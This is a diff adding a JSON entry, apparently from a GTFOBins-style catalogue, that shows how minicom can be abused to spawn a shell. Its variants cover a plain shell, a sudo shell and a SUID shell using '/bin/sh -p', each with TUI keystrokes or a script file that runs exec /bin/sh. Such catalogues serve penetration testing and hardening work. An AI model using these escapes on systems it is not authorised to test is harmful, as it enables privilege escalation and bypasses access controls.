@@ -1,0 +1,27 @@
+{
+  "description": "Note that in some versions, `Meta-Z` is used in place of `Ctrl-A`.",
+  "functions": {
+    "shell": [
+      {
+        "description": "Start the following command to open the TUI interface, then:\n1. press `Ctrl-A o` and select `Filenames and paths`;\n2. press `e`, type `/bin/sh`, then `Enter`;\n3. Press `Esc` twice;\n4. Press `Ctrl-A k` to drop the shell.\nAfter the shell, exit with `Ctrl-A x`.\n",
+        "code": "minicom -D /dev/null\n"
+      },
+      {
+        "description": "After the shell, exit with `Ctrl-A x`.\n",
+        "code": "TF=$(mktemp)\necho \"! exec /bin/sh <$(tty) 1>$(tty) 2>$(tty)\" >$TF\nminicom -D /dev/null -S $TF\nreset^J\n"
+      }
+    ],
+    "sudo": [
+      {
+        "description": "Start the following command to open the TUI interface, then:\n1. press `Ctrl-A o` and select `Filenames and paths`;\n2. press `e`, type `/bin/sh`, then `Enter`;\n3. Press `Esc` twice;\n4. Press `Ctrl-A k` to drop the shell.\nAfter the shell, exit with `Ctrl-A x`.\n",
+        "code": "sudo minicom -D /dev/null\n"
+      }
+    ],
+    "suid": [
+      {
+        "description": "Start the following command to open the TUI interface, then:\n1. press `Ctrl-A o` and select `Filenames and paths`;\n2. press `e`, type `/bin/sh -p`, then `Enter`;\n3. Press `Esc` twice;\n4. Press `Ctrl-A k` to drop the shell.\nAfter the shell, exit with `Ctrl-A x`.\n",
+        "code": "./minicom -D /dev/null\n"
+      }
+    ]
+  }
+}
